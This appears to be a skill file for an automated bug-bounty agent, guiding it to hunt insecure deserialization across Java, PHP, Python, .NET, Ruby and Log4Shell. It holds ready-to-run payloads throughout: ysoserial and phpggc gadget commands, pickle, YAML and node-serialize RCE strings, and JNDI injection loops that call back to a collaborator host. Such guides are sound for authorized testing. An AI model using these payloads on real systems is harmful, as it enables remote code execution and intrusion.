# Upstream source: deserialization (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/deserialization/SKILL.md`

---

---
name: deserialization
description: >-
  Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python
  pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost
  always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
  Combined with the HackerOne field guide (real disclosed-report data: where it pays, quick wins, payload
  banks). Hunt insecure deserialization. Use when testing cookies, tokens, caches, RPC, and language-native
  object formats. Backed by 93 disclosed HackerOne reports.
---

# Deserialization — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Insecure Deserialization — HackerOne field guide

Built from **93** publicly disclosed HackerOne reports (2015–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **93** · paid: **27**
- Median bounty **$600** · p90 **$4,500** · max **$10,000** · total **$50,091**
- Median upvotes **16**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitHub Security Lab | 6 | $17,100 | 57 |
| Pornhub | 1 | $10,000 | 271 |
| Internet Bug Bounty | 22 | $8,323 | 217 |
| Aiven Ltd | 1 | $5,000 | 45 |
| 8x8 | 2 | $3,000 | 85 |
| Vanilla | 4 | $2,100 | 120 |
| RubyGems | 2 | $1,500 | 79 |
| Acronis | 1 | $1,000 | 76 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`cookie` `session` `token` `state` `data` `job` `queue` `cache`

## Tools

`ysoserial` · `phpggc` · `marshalsec` · `Burp` · `interactsh`

## Escalation chains

- Deserialization -> RCE.
- Deserialization -> auth bypass.

## Related

- `rce` (1,399 reports)
- `memory-corruption` (892 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-DESERIALIZATION — Insecure Deserialization

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

## Attack Surface Signals

### Detection Patterns
```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Java Deserialization (ysoserial)
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"
```

### Phase 2 — PHP Object Injection
```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### Phase 3 — Python Pickle
```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 3b — PHP phar://, Python YAML, Node deserialization
- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -> object injection with zero `unserialize()` in code.
  ```bash
  phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
  # then reach  phar://uploads/poly.jpg/x  via any fs call
  ```
- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
  `!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`
- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()"}`

### Phase 4 — .NET ViewState
```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### Phase 5 — Log4Shell / JNDI
```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### Phase 6 — Ruby Marshal
```bash
# Look for Marshal.load in source
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

---

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

## Automation
```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
```

---

## Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, file types to look
- Inventory every value that round-trips through the server and could be a serialized object: session cookies, `rememberMe`, `__VIEWSTATE`, hidden form fields, `state`/`token`/`data`/`job`/`queue`/`cache` params, and any base64-looking blob in a header or JSON body.
- Fingerprint by magic bytes before crafting anything: Java serialized streams start `AC ED 00 05` (hex) / `rO0` (base64); PHP objects look like `O:8:"stdClass":0:{}`; Python pickle starts `\x80\x04` or `\x80\x02`; .NET BinaryFormatter payloads start with `AAEAAAD/////`.
- Check `Content-Type: application/x-java-serialized-object`, `application/octet-stream`, and endpoints under `/remoting/`, `/invoker/`, `/jmx-console/`, `/wls-wsat/`, `/webservices/`.
- Apache Shiro: look for a `rememberMe=` cookie and test with the default AES key before assuming a custom key.
- Log4Shell-style JNDI sinks: test *all* user-controlled fields, not just login — `User-Agent`, `X-Forwarded-For`, `Referer`, `X-Api-Version`, `Accept-Language`, JSON body values, filename/import metadata.
- PHP phar:// surface: any file-upload endpoint plus any later filesystem call on an attacker-influenced path (`file_exists`, `filesize`, `getimagesize`, `is_readable`, `include`) is a candidate — no explicit `unserialize()` in the code required.
- 2025-2026 advisories to pattern-match: OpenMage LTS GHSA-fg79-cr9c-7369 (CVE-2026-25524) — ICO/phar JPEG polyglot uploads reaching `getimagesize()` → RCE; connect.8x8.com (H1, 2026, $3,000) — Jint→Newtonsoft `TypeNameHandling` coercion in an automation builder.
- Source-review greps when you have code: `unserialize(`, `readObject(`, `pickle.loads`, `yaml.load`, `Marshal.load`, `BinaryFormatter`, `TypeNameHandling`, `ObjectInputStream`, `populate({ match:` / sift (Mongoose).
- Backup/source disclosure adjacent to the sink: PortSwigger's custom-chain lab leaks `CustomTemplate.php~` — always try `~`, `.bak`, `.old`, `.orig` on referenced source files.

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- Universal Java detection chains first, before any library-specific guess: `URLDNS` triggers a DNS lookup for a supplied URL and works on any Java version with no vulnerable dependency; `JRMPClient` forces a TCP connection (use a raw IP). For firewalled egress, send one payload with a local IP (instant response) and one with a blocked external IP (hang) — the timing delta proves deserialization in blind cases.
- Java 16+ ysoserial invocation needs `--add-opens` flags (e.g. `java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED`, `java.base/java.util=ALL-UNNAMED`); older one-liners silently fail.
- Modern Java reality check: JDK 16+ strong module encapsulation breaks most classic CommonsBeanutils chains; GadgetBuilder (Nordsec 2025) reactivated 85% of ysoserial payloads and added 29 main chains, with sink adapters such as `FileOutputStream` (file write) and `URL.getContent()` (SSRF/NTLM reflection).
- Property/type tampering before gadget hunting: flip `isAdmin` `b:0`→`b:1` in a PHP session object; exploit PHP loose comparisons by supplying integer `0` where a string password is expected (`0 == "Example string"` is true on PHP 7.x, false on PHP 8+, but `5 == "5 of something"` remains true). Remember to update all type labels and length indicators.
- PHPGGC workflow: `./phpggc -l` to list chains, `phpggc Symfony/RCE4 exec 'id' | base64`, then re-sign the cookie. PortSwigger's pre-built-chain lab leaks `SECRET_KEY` via `/cgi-bin/phpinfo.php` and rebuilds the cookie as `urlencode('{"token":"'.$object.'","sig_hmac_sha1":"'.hash_hmac('sha1',$object,$secretKey).'"}')`.
- PHP fast-destruct mode (`phpggc -f`) matters when the sink errors and rolls back before `__destruct` — without it the trigger never fires.
- Custom PHP chain pattern from the PortSwigger lab: chain `__wakeup()` → `Product` constructor → `DefaultMap::__get()` → `call_user_func($callback, $name)` to reach `exec`.
- Python pickle: `__reduce__` returning `(os.system, ('curl http://COLLAB/pickle',))`; `yaml.load` pre-5.1: `!!python/object/apply:os.system ['curl http://COLLAB/yaml']`; Node `node-serialize`: `_$$ND_FUNC$$_function(){require('child_process').exec(...)}()`.
- phar:// polyglot: `phpggc -p phar -o poly.jpg Monolog/RCE1 system id` prepends a valid JPEG/GIF header so image validation passes, then reach `phar://uploads/poly.jpg/x` through any filesystem function — PHP ignores the extension when reading a stream.
- .NET: YSoSerial.Net `-f BinaryFormatter -g TypeConfuseDelegate`; on SharePoint, chain anonymous XXE in `_vti_bin/*.asmx` → `web.config` → `<machineKey>` → ViewState deserialization RCE.

### C. Validation / proof bar — how to confirm and avoid false positives
- A DNS/HTTP callback from `URLDNS` or an OOB gadget proves *deserialization occurred* — it does not prove RCE. Escalate to a command output or a callback emitted from inside the executed command before claiming Critical.
- An exception change after tampering is only a lead; it can be a length/type validation error. Confirm with a universal detection chain.
- For signed cookies, a modified cookie that returns a signature error means the signing check is active — recover the key (debug endpoint, source disclosure, default key) before claiming anything.
- Validate the whole chain end-to-end: payload generated → encoded correctly (base64 + URL-encode where required) → accepted → magic method fired → sink reached. A generation tool succeeding is not evidence the target is vulnerable.
- Blind timing detection (JRMPClient local vs firewalled IP) must be repeated at least 3× with stable deltas; a single slow response is noise.
- When a chain fails, distinguish "wrong library/version" from "no deserialization" by re-testing with `URLDNS` — if that also fails, the entry point is not a deserialization sink.
- Severity: deserialization reaching `id`/OOB command execution is almost always Critical; object-type injection with only a privilege/cookie-state change is High; detection-only callback is Medium and should be described as confirmed deserialization, not RCE.

**Language-specific sink checklist (verify each before moving on):**
- Java: `ObjectInputStream.readObject()`, `readResolve()`, `readObjectNoData()`, XMLDecoder, XStream, Kryo, Hessian, Jackson polymorphic typing (`@class` / `defaultTyping`), SnakeYAML `Constructor` (CVE-2022-1471).
- PHP: `unserialize()`, `__wakeup()`, `__destruct()`, `__toString()`, `__get()`, `__call()`, `phar://` streams, `SimpleXMLElement`.
- Python: `pickle.loads`, `cPickle`, `dill`, `yaml.load` (unsafe loader), `marshal.loads`, `shelve`.
- .NET: `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `NetDataContractSerializer`, `TypeNameHandling` in Json.NET, ASP.NET ViewState without MAC.
- Ruby: `Marshal.load` / `Marshal.restore` — `Gem::Requirement` and `Gem::Installer` gadget chains.

**Detection payload quick reference:**
- Java universal: `java -jar ysoserial-all.jar URLDNS 'http://<collab>/probe' | base64 -w0`
- Java DNS-blocked: `JRMPClient <your-ip>` with local vs external IP timing comparison.
- PHP property flip: `O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}`
- PHP chain: `./phpggc Laravel/RCE5 system id | base64` (chain names are version-specific — expect trial and error).
- Python: `python3 -c "import pickle,os,base64; class E: ..."` → `__reduce__` → `(os.system, ('curl http://<collab>/p',))`.
- YAML: `!!python/object/apply:os.system ['curl http://<collab>/y']`
- JNDI: `${jndi:ldap://<collab>/a}` in every header/field; escalate with an LDAP → class-load chain for RCE.

**Common reasons a promising chain fails:**
- Wrong library version on the classpath — read the chain source and match versions, or try several chain names in sequence.
- Signed/encrypted cookie — signature or key must be recovered first (debug file, `.env`, `phpinfo()`, default key).
- JDK 16+ module encapsulation — use GadgetBuilder-style payloads with the required `--add-opens` flags.
- `allowed_classes => false` / `ObjectInputFilter` / `SerializationFilter` allowlists — probe which classes survive by injecting benign objects of different types.
- PHP 8 removed implicit phar metadata unserialization — confirm the target PHP version before investing in phar:// chains.

### D. Sources — numbered list of URLs you actually fetched
1. https://portswigger.net/web-security/deserialization/exploiting
2. https://www.hackerone.com/blog/how-serialized-cookies-led-rce-wordpress-website
